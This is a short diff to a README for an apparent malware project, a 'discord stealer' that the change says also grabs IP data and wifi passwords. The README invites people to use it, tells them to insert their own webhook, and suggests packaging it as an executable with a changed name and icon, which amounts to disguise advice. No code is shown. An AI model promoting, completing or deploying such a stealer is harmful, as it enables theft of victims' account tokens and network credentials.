@@ -1,5 +1,5 @@
 # kama-disord-webhook
-A simple discord stealer
+A simple discord stealer with an ip module and a wifi password grabber!
 Go to the bottom of the code and put your webhook there, it is opensource so feel free to use it :)
 I recomed using auto-py-to-exe so you can transform the file to an executable, it is very easy to use and you can change the name and icon.
 Tell me if you have any issues.
